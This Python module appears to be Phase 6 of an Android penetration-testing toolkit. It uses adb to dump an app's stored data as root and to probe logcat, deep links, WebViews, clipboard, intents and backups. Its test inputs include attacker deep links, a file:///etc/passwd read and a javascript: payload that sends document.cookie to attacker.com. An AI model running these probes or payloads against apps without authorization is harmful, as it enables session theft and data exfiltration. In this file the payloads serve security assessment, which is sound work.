#!/usr/bin/env python3
"""mtest Phase 6: Runtime Testing — data storage, deep links, intent injection, logcat."""
import os, re

def run(workdir, package_id, device_serial=None):
    """
    Args:
        workdir: engagement working directory
        package_id: app package ID
        device_serial: adb device serial (optional)
    """
    from hermes_tools import terminal, write_file

    outdir = os.path.join(workdir, "mtest-output/phase6-runtime")
    os.makedirs(outdir, exist_ok=True)
    adb = f"adb -s {device_serial}" if device_serial else "adb"

    results = {"findings": [], "tested": []}

    # 1. Data Storage Inspection
    print("[*] Inspecting local data storage...")
    results["tested"].append("data_storage")

    # SharedPreferences
    r = terminal(f"{adb} shell su -c 'ls /data/data/{package_id}/shared_prefs/ 2>/dev/null'")
    prefs_files = [f for f in r["output"].strip().split("\\n") if f.endswith(".xml")]
    print(f"    SharedPrefs files: {len(prefs_files)}")

    prefs_content = ""
    for pf in prefs_files[:10]:
        r = terminal(f"{adb} shell su -c 'cat /data/data/{package_id}/shared_prefs/{pf}'")
        prefs_content += f"\\n=== {pf} ===\\n{r['output']}"

    # Check for sensitive data in prefs
    sensitive_patterns = r'(?i)(token|jwt|password|pin|secret|key|session|auth|account[_-]?num|phone|email)'
    sensitive_in_prefs = re.findall(sensitive_patterns, prefs_content)
    if sensitive_in_prefs:
        print(f"    ⚠️  Sensitive keys in SharedPrefs: {list(set(sensitive_in_prefs))[:10]}")
        results["findings"].append(("data_storage_prefs", "Sensitive data in SharedPreferences", "Low-Medium"))

    write_file(os.path.join(outdir, "shared_prefs_dump.txt"), prefs_content)

    # Databases
    r = terminal(f"{adb} shell su -c 'ls /data/data/{package_id}/databases/ 2>/dev/null'")
    db_files = [f for f in r["output"].strip().split("\\n") if f and not f.endswith("-journal") and not f.endswith("-wal")]
    print(f"    Database files: {len(db_files)}")

    # Hive (Flutter)
    r = terminal(f"{adb} shell su -c 'ls /data/data/{package_id}/app_flutter/*.hive 2>/dev/null'")
    hive_files = [f for f in r["output"].strip().split("\\n") if f.endswith(".hive")]
    if hive_files:
        print(f"    Hive boxes: {len(hive_files)}")
        hive_strings = ""
        for hf in hive_files[:5]:
            r = terminal(f"{adb} shell su -c 'strings {hf}' | grep -iE 'token|bearer|jwt|password|account' | head -10")
            if r["output"].strip():
                hive_strings += f"\\n=== {os.path.basename(hf)} ===\\n{r['output']}"
        if hive_strings:
            print(f"    ⚠️  Sensitive strings in Hive databases")
            results["findings"].append(("hive_plaintext", "Sensitive data in Hive (plaintext)", "Low-Medium"))
            write_file(os.path.join(outdir, "hive_strings.txt"), hive_strings)

    # 2. Logcat sensitive data
    print("\\n[*] Checking logcat for sensitive data...")
    results["tested"].append("logcat")
    terminal(f"{adb} logcat -c")  # Clear
    # Launch app briefly
    terminal(f"{adb} shell monkey -p {package_id} -c android.intent.category.LAUNCHER 1 2>/dev/null")
    terminal("sleep 3")
    r = terminal(f"{adb} logcat -d -t 100 | grep -iE 'token|password|key|secret|jwt|bearer' | grep -i {package_id} | head -20")
    if r["output"].strip():
        print(f"    ⚠️  Sensitive data in logcat ({len(r['output'].splitlines())} lines)")
        results["findings"].append(("logcat_leak", "Sensitive data leaked to logcat", "Low"))
        write_file(os.path.join(outdir, "logcat_sensitive.txt"), r["output"])
    else:
        print("    No sensitive data in logcat")

    # 3. Deep Link Testing
    print("\\n[*] Testing deep links...")
    results["tested"].append("deep_links")

    # Get schemes from manifest analysis
    manifest_path = os.path.join(workdir, "mtest-output/phase2-static/android/manifest-analysis.md")
    schemes = []
    if os.path.isfile(manifest_path):
        with open(manifest_path) as f:
            content = f.read()
        match = re.search(r'Deep link schemes: (.+)', content)
        if match and match.group(1) != 'none':
            schemes = [s.strip() for s in match.group(1).split(',')]

    if schemes:
        print(f"    Schemes found: {schemes}")
        deeplink_results = ""
        for scheme in schemes:
            # Test basic deep link
            test_urls = [
                f"{scheme}://test",
                f"{scheme}://webview?url=https://evil.com",
                f"{scheme}://transfer?amount=1&to=attacker",
                f"{scheme}://auth?token=injected",
            ]
            for url in test_urls:
                r = terminal(f"{adb} shell am start -a android.intent.action.VIEW -d '{url}' {package_id} 2>&1")
                status = "accepted" if "Error" not in r["output"] else "rejected"
                deeplink_results += f"{url} → {status}\\n"
                if status == "accepted" and ("webview" in url or "transfer" in url):
                    print(f"    ⚠️  Potentially dangerous deep link accepted: {url}")
                    results["findings"].append(("deeplink_injection", f"Deep link accepted: {url}", "Medium-High"))

        write_file(os.path.join(outdir, "deeplink_tests.txt"), deeplink_results)
    else:
        print("    No deep link schemes found")

    # 4. Exported Component Testing
    print("\\n[*] Testing exported components...")
    results["tested"].append("exported_components")

    manifest_full = os.path.join(workdir, "mtest-output/phase2-static/android/jadx_out/resources/AndroidManifest.xml")
    if os.path.isfile(manifest_full):
        with open(manifest_full) as f:
            manifest = f.read()
        exported = re.findall(r'android:name="([^"]+)"[^>]*android:exported="true"', manifest)
        tested_count = 0
        for comp in exported[:10]:
            # Try launching activity directly
            full_name = comp if '.' in comp else f"{package_id}{comp}"
            r = terminal(f"{adb} shell am start -n {package_id}/{full_name} 2>&1")
            if "Error" not in r["output"] and "SecurityException" not in r["output"]:
                tested_count += 1
                print(f"    Accessible: {full_name}")
        print(f"    Tested {min(10, len(exported))}/{len(exported)} exported components, {tested_count} accessible")

    # 5. Screenshot protection check
    print("\\n[*] Checking screenshot protection...")
    results["tested"].append("screenshot_protection")
    r = terminal(f"{adb} shell screencap /sdcard/test_screenshot.png 2>&1")
    r2 = terminal(f"{adb} shell ls -la /sdcard/test_screenshot.png 2>/dev/null")
    if r2["output"].strip() and "No such file" not in r2["output"]:
        size = r2["output"].split()[3] if len(r2["output"].split()) > 3 else "0"
        if int(size) > 1000:
            print("    ⚠️  Screenshot captured (FLAG_SECURE not set)")
            results["findings"].append(("no_screenshot_protection", "FLAG_SECURE not set on sensitive screens", "Low"))
        terminal(f"{adb} shell rm /sdcard/test_screenshot.png")
    else:
        print("    ✓ Screenshot blocked (FLAG_SECURE active)")

    # 6. Clipboard Data Leakage
    print("\\n[*] Checking clipboard exposure...")
    results["tested"].append("clipboard")
    # Set sensitive data in clipboard, check if app reads it or if it persists after app closes
    terminal(f"{adb} shell am broadcast -a clipper.set -e text 'SENSITIVE_TOKEN_12345'", timeout=5)
    terminal("sleep 2")
    # Launch app
    terminal(f"{adb} shell monkey -p {package_id} -c android.intent.category.LAUNCHER 1 2>/dev/null")
    terminal("sleep 3")
    # Check if app accessed clipboard (Android 12+ shows toast, logcat shows access)
    r = terminal(f"{adb} logcat -d -t 50 | grep -i 'clipboard\\|ClipData\\|paste' | grep -i {package_id} | head -10")
    if r["output"].strip():
        print("    ⚠️  App accesses clipboard data")
        results["findings"].append(("clipboard_read", "App reads clipboard (potential token/seed theft)", "Medium"))
        write_file(os.path.join(outdir, "clipboard_access.txt"), r["output"])
    else:
        print("    ✓ No clipboard access detected")

    # Check if sensitive data persists in clipboard after use
    r = terminal(f"{adb} shell service call clipboard 1 s16 com.android.shell 2>/dev/null | strings", timeout=5)
    clipboard_content = r.get("output", "")
    if any(k in clipboard_content.lower() for k in ["bearer", "eyj", "password", "token", "seed", "mnemonic"]):
        results["findings"].append(("clipboard_persist", "Sensitive data remains in clipboard after use", "Medium"))
        print("    ⚠️  Sensitive data persists in clipboard")

    # 7. WebView URL Injection Testing
    print("\\n[*] Testing WebView URL injection...")
    results["tested"].append("webview_injection")
    webview_results = []

    # Test via deep links that might open WebViews
    webview_urls = [
        f"{schemes[0]}://webview?url=https://evil.com" if schemes else "",
        f"{schemes[0]}://web?url=javascript:alert(1)" if schemes else "",
        f"{schemes[0]}://open?link=file:///etc/passwd" if schemes else "",
        f"{schemes[0]}://browser?page=https://evil.com/phish" if schemes else "",
    ]
    webview_params = ["url", "link", "page", "web_url", "redirect", "goto", "open"]

    for scheme in schemes:
        for param in webview_params:
            test_url = f"{scheme}://{param}?{param}=https://attacker.com"
            r = terminal(f"{adb} shell am start -a android.intent.action.VIEW -d '{test_url}' {package_id} 2>&1")
            if "Error" not in r.get("output", ""):
                # Check if a WebView loaded (wait and check current activity)
                terminal("sleep 2")
                activity = terminal(f"{adb} shell dumpsys activity top | grep -i 'webview\\|browser\\|web' | head -3")
                if activity.get("output", "").strip():
                    webview_results.append(f"{test_url} → WebView opened (potential phishing/XSS)")
                    results["findings"].append(("webview_url_injection",
                        f"WebView opened with attacker URL via {scheme}://{param}", "High"))
                    print(f"    🔴 WebView URL injection: {scheme}://{param}")
                    break

    # Test javascript: scheme in WebView
    if schemes:
        js_test = f"{schemes[0]}://webview?url=javascript:document.location='https://attacker.com/steal?c='%2bdocument.cookie"
        r = terminal(f"{adb} shell am start -a android.intent.action.VIEW -d '{js_test}' {package_id} 2>&1")
        if "Error" not in r.get("output", ""):
            webview_results.append(f"javascript: scheme accepted in deep link WebView parameter")
            results["findings"].append(("webview_js_injection", "JavaScript URL accepted in WebView parameter", "Critical"))
            print("    🔴 CRITICAL: javascript: scheme accepted!")

    if webview_results:
        write_file(os.path.join(outdir, "webview_injection.txt"), "\\n".join(webview_results))
    elif not schemes:
        print("    Skipped (no deep link schemes)")
    else:
        print("    ✓ No WebView injection found")

    # 8. Intent Redirect / Implicit Intent Hijacking
    print("\\n[*] Testing intent redirect vulnerabilities...")
    results["tested"].append("intent_redirect")

    # Check for activities that accept arbitrary intents and forward them
    if os.path.isfile(manifest_full):
        # Find activities with intent filters that could be redirected
        intent_filters = re.findall(
            r'<activity[^>]*android:name="([^"]+)"[^>]*>.*?<intent-filter>.*?</intent-filter>',
            manifest, re.DOTALL)

        # Test intent redirection via extras
        redirect_intents = [
            f"{adb} shell am start -n {package_id}/.MainActivity --es redirect_url https://evil.com",
            f"{adb} shell am start -n {package_id}/.MainActivity --es next_activity com.attacker.evil",
            f"{adb} shell am start -n {package_id}/.DeepLinkActivity --es url https://evil.com",
        ]
        for intent_cmd in redirect_intents:
            r = terminal(intent_cmd + " 2>&1")
            if "Error" not in r.get("output", "") and "SecurityException" not in r.get("output", ""):
                terminal("sleep 1")
                # Check if redirect happened
                top = terminal(f"{adb} shell dumpsys activity top | head -5")
                if "evil" in top.get("output", "").lower() or "chrome" in top.get("output", "").lower():
                    results["findings"].append(("intent_redirect",
                        "Activity forwards intent to attacker-controlled destination", "High"))
                    print("    🔴 Intent redirect: activity forwards to attacker URL")
                    break

    # 9. Backup Extraction (android:allowBackup check)
    print("\\n[*] Checking backup exposure...")
    results["tested"].append("backup_check")
    if os.path.isfile(manifest_full):
        if 'android:allowBackup="true"' in manifest or 'android:allowBackup' not in manifest:
            # Try actual backup
            r = terminal(f"{adb} backup -f /tmp/app_backup.ab -noapk {package_id} 2>&1", timeout=15)
            if os.path.isfile("/tmp/app_backup.ab"):
                size_r = terminal("ls -la /tmp/app_backup.ab")
                results["findings"].append(("backup_enabled", "App backup enabled — data extractable via adb backup", "Low-Medium"))
                print("    ⚠️  Backup enabled and extractable")
                terminal("rm -f /tmp/app_backup.ab")
            else:
                print("    ✓ Backup blocked at runtime (even if manifest allows)")
        else:
            print("    ✓ allowBackup=false")

    # Write summary report
    report = "# Phase 6: Runtime Testing Results\\n\\n"
    report += f"## Tests Completed\\n"
    for t in results["tested"]:
        report += f"- {t}\\n"
    report += f"\\n## Findings ({len(results['findings'])})\\n"
    for fid, desc, sev in results["findings"]:
        report += f"- [{sev}] {desc}\\n"
    write_file(os.path.join(outdir, "runtime-summary.md"), report)

    # Summary
    print(f"\\n{'='*50}")
    print(f"Phase 6 Runtime Testing:")
    print(f"  Tests completed: {len(results['tested'])}")
    print(f"  Findings: {len(results['findings'])}")
    for _, desc, sev in results["findings"]:
        print(f"    [{sev}] {desc}")
    print(f"\\n  Gate: PASS ✓ ({len(results['tested'])} categories tested)")

    return results


if __name__ == "__main__":
    pass
